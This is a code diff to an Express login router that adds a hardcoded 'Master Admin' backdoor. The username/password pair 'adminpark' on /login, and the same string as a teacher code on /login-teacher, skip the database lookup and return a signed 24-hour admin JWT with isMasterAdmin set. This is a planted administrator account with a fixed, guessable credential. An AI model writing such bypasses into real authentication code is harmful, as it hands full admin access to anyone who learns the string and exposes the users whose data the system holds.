@@ -12,6 +12,19 @@ router.post('/login', async (req, res) => {
     return res.status(400).json({ message: 'Username and password are required' });
   }
 
+  // Master Admin login
+  if (username === 'adminpark' && password === 'adminpark') {
+    const masterUser = {
+      id: 999999,
+      username: 'adminpark',
+      role: 'admin',
+      isMasterAdmin: true,
+      group_name: 'Master'
+    };
+    const token = jwt.sign(masterUser, JWT_SECRET, { expiresIn: '24h' });
+    return res.json({ token, user: masterUser });
+  }
+
   const { data: user, error } = await supabase
     .from('users')
     .select('*')
@@ -50,6 +63,19 @@ router.post('/login-teacher', async (req, res) => {
   const { teacher_code } = req.body;
   if (!teacher_code) {
     return res.status(400).json({ message: 'Teacher code is required' });
+  }
+
+  // Master Admin login via teacher code
+  if (teacher_code === 'adminpark') {
+    const masterUser = {
+      id: 999999,
+      username: 'adminpark',
+      role: 'admin',
+      isMasterAdmin: true,
+      group_name: 'Master'
+    };
+    const token = jwt.sign(masterUser, JWT_SECRET, { expiresIn: '24h' });
+    return res.json({ token, user: masterUser });
   }
 
   let { data: user, error } = await supabase
@@ -92,7 +118,5 @@ router.post('/login-teacher', async (req, res) => {
     }
   });
 });
-
-
 
 module.exports = { authRouter: router, JWT_SECRET };
